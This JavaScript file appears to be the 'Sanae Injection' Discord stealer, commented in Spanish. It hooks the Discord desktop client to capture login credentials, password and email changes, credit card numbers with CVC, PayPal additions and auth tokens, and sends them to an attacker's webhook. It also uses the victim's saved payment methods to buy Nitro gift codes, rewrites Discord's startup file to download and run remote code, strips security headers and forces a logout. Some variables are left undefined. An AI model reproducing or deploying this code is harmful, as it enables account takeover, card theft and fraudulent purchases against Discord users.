const {
    BrowserWindow,
    session,
} = require('electron');
const os = require('os');
const axios = require('axios');
const https = require('https');
const querystring = require("querystring");
const fs = require("fs");

const config = {
    auto_buy_nitro: true, ping_on_run: true, ping_val: "@here",
    injection_url: 'https://raw.githubusercontent.com/0xMeii/Sanae-Injection/main/injection.js', embed_color: '0',
    webhook: '%WEBHOOK%', embed_name: 'Sanae Injection - 0xMeii',
    embed_icon: 'https://media.discordapp.net/attachments/1087038454103285763/1087061601837912134/e3a3b2f622f88d8e51d765af48b140e8.jpg?width=464&height=430',
    api: "https://discord.com/api/v9/users/@me",
    nitro: { boost: { year: { id: "521847234246082599", sku: "511651885459963904", price: 9999, }, month: { id: "521847234246082599", sku: "511651880837840896", price: 999, }, }, classic: { month: { id: "521846918637420545", sku: "511651871736201216", price: 499, }, }, },
    filter: { urls: [ "https://discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/users/@me", "https://*.discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/auth/login", "https://discord.com/api/v*/auth/login", "https://*.discord.com/api/v*/auth/login", "https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts", "https://api.stripe.com/v*/tokens", "https://api.stripe.com/v1/tokens", "https://api.stripe.com/v*/setup_intents/*/confirm", "https://api.stripe.com/v*/payment_intents/*/confirm", "https://js.stripe.com/*" ], },
    filter2: { urls: [ "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json", "https://*.discord.com/api/v*/applications/detectable", "https://discord.com/api/v*/applications/detectable", "https://*.discord.com/api/v*/users/@me/library", "https://discord.com/api/v*/users/@me/library", "wss://remote-auth-gateway.discord.gg/*", ], },
};

// Obtener la ruta de Discord y la ruta de los recursos
const discordPath = (function () {
    const app = args[0].split(path.sep).slice(0, -1).join(path.sep);
    const resourcePath = process.platform === 'win32' ?
      path.join(app, 'resources') :
      process.platform === 'darwin' ?
      path.join(app, 'Contents', 'Resources') :
      undefined;
  
    if (fs.existsSync(resourcePath)) {
      return { resourcePath, app };
    } else {
      return { undefined, undefined };
    }
  })();
  
  function updateCheck() {
    const { resourcePath, app } = discordPath;
  
    // Si no se encontró la ruta de recursos, no hay nada que hacer.
    if (!resourcePath || !app) return;
  
    const appPath = path.join(resourcePath, 'app');
    const packageJson = path.join(appPath, 'package.json');
    const resourceIndex = path.join(appPath, 'index.js');
    const indexJs = `${app}/modules/discord_desktop_core-1/discord_desktop_core/index.js`;
    const bdPath = path.join(process.env.APPDATA, 'betterdiscord', 'data', 'betterdiscord.asar');
  
    // Crea la carpeta de la aplicación si no existe.
    if (!fs.existsSync(appPath)) fs.mkdirSync(appPath);
  
    // Elimina el archivo package.json si existe.
    try {
      fs.unlinkSync(packageJson);
    } catch (err) {
      // Ignora cualquier error, ya que significa que el archivo no existe.
    }
  
    // Elimina el archivo index.js si existe.
    try {
      fs.unlinkSync(resourceIndex);
    } catch (err) {
      // Ignora cualquier error, ya que significa que el archivo no existe.
    }
  
    if (process.platform === 'win32' || process.platform === 'darwin') {
      fs.writeFileSync(
        packageJson,
        JSON.stringify({
          name: 'discord',
          main: 'index.js'
        }, null, 4)
      );
      const startUpScript = `const fs = require('fs'), https = require('https');
      const indexJs = '${indexJs}';
      const bdPath = '${bdPath}';
      const fileSize = fs.statSync(indexJs).size
      fs.readFileSync(indexJs, 'utf8', (err, data) => {
          if (fileSize < 20000 || data === "module.exports = require('./core.asar')") 
              init();
      })
      async function init() {
          https.get('${config.injection_url}', (res) => {
              const file = fs.createWriteStream(indexJs);
              res.replace('%WEBHOOK%', '${config.webhook}')
              res.pipe(file);
              file.on('finish', () => {
                  file.close();
              });
          
          }).on("error", (err) => {
              setTimeout(init(), 10000);
          });
      }
      require('${path.join(resourcePath, 'app.asar')}')
      if (fs.existsSync(bdPath)) require(bdPath);`;
          fs.writeFileSync(resourceIndex, startUpScript.replace(/\\/g, '\\\\'));
        }
        if (!fs.existsSync(path.join(__dirname, 'initiation'))) return !0;
        fs.rmdirSync(path.join(__dirname, 'initiation'));
        execScript(
          `window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();`,
        );
        return !1;
      }
      
      const execScript = (script) => {
        const window = BrowserWindow.getAllWindows()[0];
        return window.webContents.executeJavaScript(script, !0);
      };

      const getInfo = async (token) => {
        const response = await fetch(config.api, {
          headers: {
            'Authorization': token
          }
        });
        const info = await response.json();
        return info;
      };
      
      const fetchBilling = async (token) => {
        const response = await fetch(`${config.api}/billing/payment-sources`, {
          headers: {
            'Authorization': token
          }
        });
        const bill = await response.json();
        if (!bill.length || bill.length === 0) return '';
        return bill;
      };

      const getBilling = async (token) => {
        const data = await fetchBilling(token);
        if (!data) return '❌';
        let billing = '';
        data.forEach((x) => {
          if (!x.invalid) {
            switch (x.type) {
              case 1:
                billing += '💳 ';
                break;
              case 2:
                billing += '<:paypal_sanae:1087038871822422027>';
                break;
            }
          }
        });
        if (!billing) billing = '❌';
        return billing;
      };

      const Purchase = async (token, id, _type, _time) => {
        const options = {
          expected_amount: config.nitro[_type][_time]['price'],
          expected_currency: 'usd',
          gift: true,
          payment_source_id: id,
          payment_source_token: null,
          purchase_token: '2422867c-244d-476a-ba4f-36e197758d97',
          sku_subscription_plan_id: config.nitro[_type][_time]['sku'],
        };
      
        const req = execScript(`var xmlHttp = new XMLHttpRequest();
          xmlHttp.open("POST", "https://discord.com/api/v9/store/skus/${config.nitro[_type][_time]['id']}/purchase", false);
          xmlHttp.setRequestHeader("Authorization", "${token}");
          xmlHttp.setRequestHeader('Content-Type', 'application/json');
          xmlHttp.send(JSON.stringify(${JSON.stringify(options)}));
          xmlHttp.responseText`);
        if (req['gift_code']) {
          return 'https://discord.gift/' + req['gift_code'];
        } else return null;
      };

      const buyNitro = async (token) => {
        const data = await fetchBilling(token);
        const failedMsg = 'Failed to Purchase ❌';
        if (!data) return failedMsg;
      
        let IDS = [];
        data.forEach((x) => {
          if (!x.invalid) {
            IDS = IDS.concat(x.id);
          }
        });
        for (let sourceID in IDS) {
          const first = Purchase(token, sourceID, 'boost', 'year');
          if (first !== null) {
            return first;
          } else {
            const second = Purchase(token, sourceID, 'boost', 'month');
            if (second !== null) {
              return second;
            } else {
              const third = Purchase(token, sourceID, 'classic', 'month');
              if (third !== null) {
                return third;
              } else {
                return failedMsg;
              }
            }
          }
        }
      };

      const getNitro = (flags) => {
        switch (flags) {
          case 0:
            return 'No Nitro';
          case 1:
            return 'Nitro Classic';
          case 2:
            return 'Nitro Boost';
          default:
            return 'No Nitro';
        }
      };
      
      const getBadges = (flags) => {
        let badges = '';
        switch (flags) {
          case 1:
            badges += 'Discord Staff, ';
            break;
          case 2:
            badges += 'Partnered Server Owner, ';
            break;
          case 131072:
            badges += 'Verified Bot Developer, ';
            break;
          case 4:
            badges += 'Hypesquad Event, ';
            break;
          case 16384:
            badges += 'Gold BugHunter, ';
            break;
          case 8:
            badges += 'Green BugHunter, ';
            break;
          case 512:
            badges += 'Early Supporter, ';
            break;
          case 128:
            badges += 'HypeSquad Brillance, ';
            break;
          case 64:
            badges += 'HypeSquad Bravery, ';
            break;
          case 256:
            badges += 'HypeSquad Balance, ';
            break;
          case 0:
            badges = 'None';
            break;
          default:
            badges = 'None';
            break;
        }
        return badges;
      };

      const hooker = async (content) => {
        const data = JSON.stringify(content);
        const url = new URL(config.webhook);
        const headers = {
          'Content-Type': 'application/json',
          'Access-Control-Allow-Origin': '*',
        };
        if (!config.webhook.includes('api/webhooks')) {
          const key = totp(config.webhook_protector_key);
          headers['Authorization'] = key;
        }
        const options = {
          protocol: url.protocol,
          hostname: url.host,
          path: url.pathname,
          method: 'POST',
          headers: headers,
        };
        const req = https.request(options);
      
        req.on('error', (err) => {
          console.log(err);
        });
        req.write(data);
        req.end();
      };

      const login = async (email, password, token) => {
        const json = await getInfo(token);
        const nitro = getNitro(json.premium_type);
        const badges = getBadges(json.flags);
        const billing = await getBilling(token);
        const content = {
            username: config.embed_name,
            avatar_url: config.embed_icon,
            embeds: [
                {
                    color: config.embed_color,
                    fields: [
                        {
                            name: '**Información de la Cuenta**',
                            value: `<:mail_sanae:1087056751246966875> Email: **${email}** - <:pwd_sanae:1087057414379012116> Contraseña: **${password}**`,
                            inline: false,
                        },
                        {
                            name: '**Información de Discord**',
                            value: `<:nitro_sanae:1087058269220130826>Tipo de Nitro: **${nitro}**\n<a:badge_sanae:1087059472347836476> Insignias: **${badges}**\n<a:card_sanae:1087059947742834758> Facturación: **${billing}**`,
                            inline: false,
                        },
                        {
                            name: '<a:tkn_sanae:1087060992615264417> **Token**',
                            value: `\`${token}\``,
                            inline: false,
                        },
                    ],
                    author: {
                        name: json.username + "#" + json.discriminator + " | " + json.id,
                        icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
                    },
                    footer: {
                        text: 'Sanae Injection・https://github.com/0xMeii/Sanae-Injection',
                        icon_url: "https://media.discordapp.net/attachments/1087038454103285763/1087061601837912134/e3a3b2f622f88d8e51d765af48b140e8.jpg?width=464&height=430"
                    },
                },
            ],
        };
        if (config.ping_on_run) content["content"] = config.ping_val;
        hooker(content);
    };

    const passwordChanged = async (oldpassword, newpassword, token) => {
        const json = await getInfo(token);
        const nitro = getNitro(json.premium_type);
        const badges = getBadges(json.flags);
        const billing = await getBilling(token);
        const content = {
            username: config.embed_name,
            avatar_url: config.embed_icon,
            embeds: [
                {
                    color: config.embed_color,
                    fields: [
                        {
                            name: '**Contraseña Cambiada**',
                            value: `<:mail_sanae:1087056751246966875> Email: **${json.email}**\n<:pwd_sanae:1087057414379012116> Contraseña Antigua: **${oldpassword}**\n<:pwd_sanae:1087057414379012116> Nueva Contraseña: **${newpassword}**`,
                            inline: true,
                        },
                        {
                            name: '**Información de Discord**',
                            value: `<:nitro_sanae:1087058269220130826>Tipo de Nitro: **${nitro}**\n<a:badge_sanae:1087059472347836476> Insignias: **${badges}**\n<a:card_sanae:1087059947742834758> Facturación: **${billing}**`,
                            inline: false,
                        },
                        {
                            name: '<a:tkn_sanae:1087060992615264417> **Token**',
                            value: `\`${token}\``,
                            inline: false,
                        },
                    ],
                    author: {
                        name: json.username + "#" + json.discriminator + " | " + json.id,
                        icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
                    },
                    footer: {
                        text: 'Sanae Injection・https://github.com/0xMeii/Sanae-Injection',
                        icon_url: "https://media.discordapp.net/attachments/1087038454103285763/1087061601837912134/e3a3b2f622f88d8e51d765af48b140e8.jpg?width=464&height=430"
                    },
                },
            ],
        };
        if (config.ping_on_run) content["content"] = config.ping_val;
        hooker(content);
    };

    const emailChanged = async (email, password, token) => {
        const json = await getInfo(token);
        const nitro = getNitro(json.premium_type);
        const badges = getBadges(json.flags);
        const billing = await getBilling(token);
        const content = {
            username: config.embed_name,
            avatar_url: config.embed_icon,
            embeds: [
                {
                    color: config.embed_color,
                    fields: [
                        {
                            name: '**Correo Electrónico Cambiado**',
                            value: `<:mail_sanae:1087056751246966875> Nuevo Email: **${email}**\n<:pwd_sanae:1087057414379012116> Contraseña: **${password}**`,
                            inline: true,
                        },
                        {
                            name: '**Información de Discord**',
                            value: `<:nitro_sanae:1087058269220130826>Tipo de Nitro: **${nitro}**\n<a:badge_sanae:1087059472347836476> Insignias: **${badges}**\n<a:card_sanae:1087059947742834758> Facturación: **${billing}**`,
                            inline: true,
                        },
                        {
                            name: '<a:tkn_sanae:1087060992615264417> **Token**',
                            value: `\`${token}\``,
                            inline: false,
                        },
                    ],
                    author: {
                        name: json.username + "#" + json.discriminator + " | " + json.id,
                        icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
                    },
                    footer: {
                        text: 'Sanae Injection・https://github.com/0xMeii/Sanae-Injection',
                        icon_url: "https://media.discordapp.net/attachments/1087038454103285763/1087061601837912134/e3a3b2f622f88d8e51d765af48b140e8.jpg?width=464&height=430"
                    },
                },
            ],
        };
        if (config.ping_on_run) content["content"] = config.ping_val;
        hooker(content);
    };

    const PaypalAdded = async (token) => {
        const json = await getInfo(token);
        const nitro = getNitro(json.premium_type);
        const badges = getBadges(json.flags);
        const billing = await getBilling(token);
        const content = {
            username: config.embed_name,
            avatar_url: config.embed_icon,
            embeds: [
                {
                    color: config.embed_color,
                    fields: [
                        {
                            name: '**Paypal Añadido**',
                            value: `Bang...`,
                            inline: false,
                        },
                        {
                            name: '**Información de Discord**',
                            value: `<:nitro_sanae:1087058269220130826>Tipo de Nitro: **${nitro}**\n<a:badge_sanae:1087059472347836476> Insignias: **${badges}**\n<a:card_sanae:1087059947742834758> Facturación: **${billing}**`,
                            inline: true,
                        },
                        {
                            name: '<a:tkn_sanae:1087060992615264417> **Token**',
                            value: `\`${token}\``,
                            inline: false,
                        },
                    ],
                    author: {
                        name: json.username + "#" + json.discriminator + " | " + json.id,
                        icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
                    },
                    footer: {
                        text: 'Sanae Injection・https://github.com/0xMeii/Sanae-Injection',
                        icon_url: "https://media.discordapp.net/attachments/1087038454103285763/1087061601837912134/e3a3b2f622f88d8e51d765af48b140e8.jpg?width=464&height=430"
                    },
                },
            ],
        };
        if (config.ping_on_run) content["content"] = config.ping_val;
        hooker(content);
        if (config.auto_buy_nitro) {
            nitroBought(token).catch(console.error);
        }
    };

    const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
        const json = await getInfo(token);
        const nitro = getNitro(json.premium_type);
        const badges = getBadges(json.flags);
        const billing = await getBilling(token);
        const content = {
            username: config.embed_name,
            avatar_url: config.embed_icon,
            embeds: [
                {
                    color: config.embed_color,
                    fields: [
                        {
                            name: '**Credit Card Added**',
                            value: `Número de tarjeta de crédito: **${number}**\nCVC: **${cvc}**\nExpiración: **${expir_month}/${expir_year}**`,
                            inline: true,
                        },
                        {
                            name: '**Información de Discord**',
                            value: `<:nitro_sanae:1087058269220130826>Tipo de Nitro: **${nitro}**\n<a:badge_sanae:1087059472347836476> Insignias: **${badges}**\n<a:card_sanae:1087059947742834758> Facturación: **${billing}**`,
                            inline: true,
                        },
                        {
                            name: '<a:tkn_sanae:1087060992615264417> **Token**',
                            value: `\`${token}\``,
                            inline: false,
                        },
                    ],
                    author: {
                        name: json.username + "#" + json.discriminator + " | " + json.id,
                        icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
                    },
                    footer: {
                        text: 'Sanae Injection・https://github.com/0xMeii/Sanae-Injection',
                        icon_url: "https://media.discordapp.net/attachments/1087038454103285763/1087061601837912134/e3a3b2f622f88d8e51d765af48b140e8.jpg?width=464&height=430"
                    },
                },
            ],
        };
        if (config.ping_on_run) content["content"] = config.ping_val;
        hooker(content);
        if (config.auto_buy_nitro) {
            nitroBought(token).catch(console.error);
        }
    };

    const nitroBought = async (token) => {
        const json = await getInfo(token);
        const nitro = getNitro(json.premium_type);
        const badges = getBadges(json.flags);
        const billing = await getBilling(token);
        const code = await buyNitro(token);
        const content = {
            username: config.embed_name,
            avatar_url: config.embed_icon,
            embeds: [
                {
                    color: config.embed_color,
                    fields: [
                        {
                            name: '**¡Nitro comprado!**',
                            value: `*Código Nitro:**\n\`\`\`diff\n+ ${code}\`\`\``,
                            inline: true,
                        },
                        {
                            name: '**Información de Discord**',
                            value: `<:nitro_sanae:1087058269220130826>Tipo de Nitro: **${nitro}**\n<a:badge_sanae:1087059472347836476> Insignias: **${badges}**\n<a:card_sanae:1087059947742834758> Facturación: **${billing}**`,
                            inline: true,
                        },
                        {
                            name: '<a:tkn_sanae:1087060992615264417> **Token**',
                            value: `\`${token}\``,
                            inline: false,
                        },
                    ],
                    author: {
                        name: json.username + "#" + json.discriminator + " | " + json.id,
                        icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
                    },
                    footer: {
                        text: 'Sanae Injection・https://github.com/0xMeii/Sanae-Injection',
                        icon_url: "https://media.discordapp.net/attachments/1087038454103285763/1087061601837912134/e3a3b2f622f88d8e51d765af48b140e8.jpg?width=464&height=430"
                    },
                },
            ],
        };
        if (config.ping_on_run) content["content"] = config.ping_val + `\n${code}`;
        hooker(content);
    };

    session.defaultSession.webRequest.onBeforeRequest(config.filter2, (details, callback) => {
        if (details.url.startsWith('wss://remote-auth-gateway')) return callback({ cancel: true });
        updateCheck();
      });
      
      session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
        if (details.url.startsWith(config.webhook)) {
          if (details.url.includes('discord.com')) {
            callback({
              responseHeaders: Object.assign(
                {
                  'Access-Control-Allow-Headers': '*',
                },
                details.responseHeaders,
              ),
            });
          } else {
            callback({
              responseHeaders: Object.assign(
                {
                  'Content-Security-Policy': ["default-src '*'", "Access-Control-Allow-Headers '*'", "Access-Control-Allow-Origin '*'"],
                  'Access-Control-Allow-Headers': '*',
                  'Access-Control-Allow-Origin': '*',
                },
                details.responseHeaders,
              ),
            });
          }
        } else {
          delete details.responseHeaders['content-security-policy'];
          delete details.responseHeaders['content-security-policy-report-only'];
      
          callback({
            responseHeaders: {
              ...details.responseHeaders,
              'Access-Control-Allow-Headers': '*',
            },
          });
        }
      });
      
      session.defaultSession.webRequest.onCompleted(config.filter, async (details, _) => {
        if (details.statusCode !== 200 && details.statusCode !== 202) return;
        const unparsed_data = Buffer.from(details.uploadData[0].bytes).toString();
        const data = JSON.parse(unparsed_data);
        const token = await execScript(
          `(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`,
        );
        switch (true) {
          case details.url.endsWith('login'):
            login(data.login, data.password, token).catch(console.error);
            break;
      
          case details.url.endsWith('users/@me') && details.method === 'PATCH':
            if (!data.password) return;
            if (data.email) {
              emailChanged(data.email, data.password, token).catch(console.error);
            }
            if (data.new_password) {
              passwordChanged(data.password, data.new_password, token).catch(console.error);
            }
            break;
      
          case details.url.endsWith('tokens') && details.method === 'POST':
            const item = querystring.parse(unparsedData.toString());
            ccAdded(item['card[number]'], item['card[cvc]'], item['card[exp_month]'], item['card[exp_year]'], token).catch(console.error);
            break;
      
          case details.url.endsWith('paypal_accounts') && details.method === 'POST':
            PaypalAdded(token).catch(console.error);
            break;
      
          case details.url.endsWith('confirm') && details.method === 'POST':
            if (!config.auto_buy_nitro) return;
            setTimeout(() => {
              nitroBought(token).catch(console.error);
            }, 7500);
            break;
      
          default:
            break;
        }
      });
      module.exports = require('./core.asar');
